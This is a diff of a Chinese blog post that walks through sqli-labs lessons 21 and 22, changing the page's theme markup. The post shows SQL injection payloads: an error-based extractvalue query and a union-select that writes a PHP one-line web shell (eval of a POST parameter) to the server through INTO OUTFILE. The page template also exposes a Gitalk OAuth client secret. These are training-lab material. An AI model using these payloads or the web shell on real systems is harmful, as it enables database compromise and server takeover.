-<p>重新打开网页，浏览器从硬盘上取出<code>cookie$_COOKIE[&#39;uname&#39;]</code>。页面显示cookie状态信息，执行的条件是<code>submit</code>事件不被触发。<br>—&gt;将<code>$cookee</code>传入到数据库中判断语法是否错误，<code>cookee</code>值是否与数据库字段匹配（这一步操作在现实中应该是在一定程度上保证cookie值不被恶意构造）<br><img src="./19.png" srcset="/img/loading.gif" alt=""><br>若<code>submit</code>事件触发则删除<code>cookie</code>值<br><img src="./20.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="0x06-less-21-试试一句话"><a href="#0x06-less-21-试试一句话" class="headerlink" title="0x06 less-21 试试一句话"></a>0x06 less-21 试试一句话</h1><p>正常登陆之后<br><img src="./21.png" srcset="/img/loading.gif" alt=""></p>
-<p>使用burpsuite抓包，传入的uname经过base64编码<br><img src="./22.png" srcset="/img/loading.gif" alt=""></p>
-<p>爆数据库目录：payload:’)and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and (‘1’)=(‘1<br><img src="./23.png" srcset="/img/loading.gif" alt=""></p>
-<p>传入一句话<br>*：union 查询条件前列数相同且前一句sql语句能执行,不同与报错盲注<br>payload：<code>admin&#39;) union select 1,&#39;&lt;?php @eval($_POST[&quot;mima&quot;])?&gt;&#39;,3 into outfile &quot;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-21\\1.php&quot;#</code><br><img src="./24.png" srcset="/img/loading.gif" alt=""></p>
+<h4 id="源码学习与分析："><a href="#源码学习与分析：" class="headerlink" title="源码学习与分析："></a>源码学习与分析：</h4><p>输入正确的账号密码，执行setcookie(‘uname’,$cookee,time()+3600)函数，跳转界面（刷新）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./18.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>重新打开网页，浏览器从硬盘上取出<code>cookie$_COOKIE[&#39;uname&#39;]</code>。页面显示cookie状态信息，执行的条件是<code>submit</code>事件不被触发。<br>—&gt;将<code>$cookee</code>传入到数据库中判断语法是否错误，<code>cookee</code>值是否与数据库字段匹配（这一步操作在现实中应该是在一定程度上保证cookie值不被恶意构造）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./19.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>若<code>submit</code>事件触发则删除<code>cookie</code>值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./20.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="0x06-less-21-试试一句话"><a href="#0x06-less-21-试试一句话" class="headerlink" title="0x06 less-21 试试一句话"></a>0x06 less-21 试试一句话</h1><p>正常登陆之后</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./21.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用burpsuite抓包，传入的uname经过base64编码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./22.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>爆数据库目录：payload:’)and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and (‘1’)=(‘1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./23.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>传入一句话<br>*：union 查询条件前列数相同且前一句sql语句能执行,不同与报错盲注<br>payload：<code>admin&#39;) union select 1,&#39;&lt;?php @eval($_POST[&quot;mima&quot;])?&gt;&#39;,3 into outfile &quot;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-21\\1.php&quot;#</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./24.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="0x07-less-22-e…"><a href="#0x07-less-22-e…" class="headerlink" title="0x07 less-22 e…."></a>0x07 less-22 e….</h1><p>payload: <code>admin1&quot;and extractvalue(1,concat(0x7e,(selectdatabase()),0x7e))#</code><br>其他就和less-21相同就不一一赘述了</p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2018/12/22/ubuntu-LAMP-SQLILABS/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ubuntu(LAMP)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2018/12/20/sql%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
-                        <span class="hidden-mobile">sql双查询注入</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-15T08:25:50.000Z" itemprop="dateUpdated">2020-05-15 16:25:50</time>
+</span><br>
+
+
+        
+        玩的开心
+        
+    </div>
+    
+    <footer>
+        <a href="http://zhzhdoai.github.io">
+            <img src="/img/avatar.jpg" alt="osword">
+            osword
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
 
             
-          </article>
-        </div>
-      </div>
-    </div>
+<div class="page-share-wrap">
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
 
-      </div>
-    
-  </div>
-</div>
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&title=《sqlilabs17-22》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&title=《sqlilabs17-22》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlilabs17-22》 — osword's blog&url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
 
-<!-- Custom -->
 
 
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
     </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-  
 
-  
 
-  
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
+        </div>
     </div>
+
     
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/12/22/ubuntu-LAMP-SQLILABS/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">ubuntu(LAMP)</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/12/20/sql%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">sql双查询注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
 
     
 
-    
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script src="/js/md5.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '7d7576c71632f14d639a',
+            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
+            repo: 'zhzhdoai.github.io',
+            owner: 'zhzhdoai',
+            admin: 'zhzhdoai',
+            id: md5(location.pathname),
+            perPage: 50,
+            distractionFreeMode: 'false'
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>osword &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
 
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&title=《sqlilabs17-22》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&title=《sqlilabs17-22》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlilabs17-22》 — osword's blog&url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/" alt="微信分享二维码">
+</div>
 
 
 
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
 
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: '#post-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "sqlilabs17-22&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+})();
+</script>
 
 
 
